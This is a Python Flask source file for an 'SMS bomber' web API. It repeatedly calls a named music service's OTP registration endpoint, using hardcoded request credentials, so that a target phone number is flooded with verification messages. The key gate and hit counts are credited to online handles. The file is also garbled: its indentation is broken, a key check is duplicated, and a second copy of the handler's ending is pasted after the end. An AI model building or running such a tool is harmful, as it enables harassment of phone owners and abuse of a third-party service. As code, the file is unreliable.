import asyncio
import aiohttp
from flask import Flask, request, jsonify

app = Flask(__name__)

# SECURITY KEY: Kew link peleo eita chara hit korte parbe na
# top e add koro
key_usage = {}
MAX_LIMIT = 10
SECRET_KEY = "RASHIK_VY" 

async def hit_service(session, phone):
    # Provider name hidden
    url = "https://coreapi.shadhinmusic.com/api/v5/otp/otpreq"
    payload = {
        "msisdn": f"880{phone[-10:]}",
        "user": "sh@dHinOTP",
        "servicename": "Shadhin",
        "action": "Registration"
    }
    try:
        async with session.post(url, json=payload, timeout=5) as resp:
            return resp.status
    except:
        return None

@app.route('/api', methods=['GET'])
def server_api():
    phone = request.args.get('num')
    amount = request.args.get('amt', default=1, type=int)
    key = request.args.get('key')

    # 1. Access Protection
    if key != SECRET_KEY:
        return jsonify({"error": "Unauthorized Access!", "owner": "@RASHIK_69"}), 403
    
    if key not in key_usage:
    key_usage[key] = 0

if key not in key_usage:
    key_usage[key] = 0

if key not in key_usage:
        key_usage[key] = 0

    if key_usage[key] >= MAX_LIMIT:
        return jsonify({
            "success": False,
            "msg": "This key limit exceeded",
            "limit": MAX_LIMIT,
            "used": key_usage[key],
            "remaining": 0,
            "credit": "@RASHIK_69"
        }), 429

    key_usage[key] += 1

    # 2. Maximum Amount Limit (Strict 10)
    if amount > 10:
        return jsonify({"status": "failed", "msg": "Max amount is 10"}), 400

    if not phone or len(phone) < 10:
        return jsonify({"status": "failed", "msg": "Invalid Number"}), 400

    # 3. High Speed Async Execution
    async def run_bombing():
        async with aiohttp.ClientSession() as session:
            tasks = [hit_service(session, phone) for _ in range(amount)]
            return await asyncio.gather(*tasks)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bombing())
    loop.close()

    return jsonify({
    "success": True,
    "target": phone,
    "hits": amount,
    "used": key_usage[key],
    "remaining": MAX_LIMIT - key_usage[key],
    "limit": MAX_LIMIT,
    "credit": "@RASHIK_69",
    "status": "Active!"
})

# Vercel handling
def handler(event, context):
    return app(event, context)
        return jsonify({"status": "failed", "msg": "Max amount is 10"}), 400

    if not phone or len(phone) < 10:
        return jsonify({"status": "failed", "msg": "Invalid Number"}), 400

    # 3. High Speed Async Execution
    async def run_bombing():
        async with aiohttp.ClientSession() as session:
            tasks = [hit_service(session, phone) for _ in range(amount)]
            return await asyncio.gather(*tasks)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bombing())
    loop.close()

    return jsonify({
        "success": True,
        "target": phone,
        "hits": amount,
        "owner": "@sunny7695",
        "status": "System Online"
    })

# Vercel handling
def handler(event, context):
    return app(event, context)
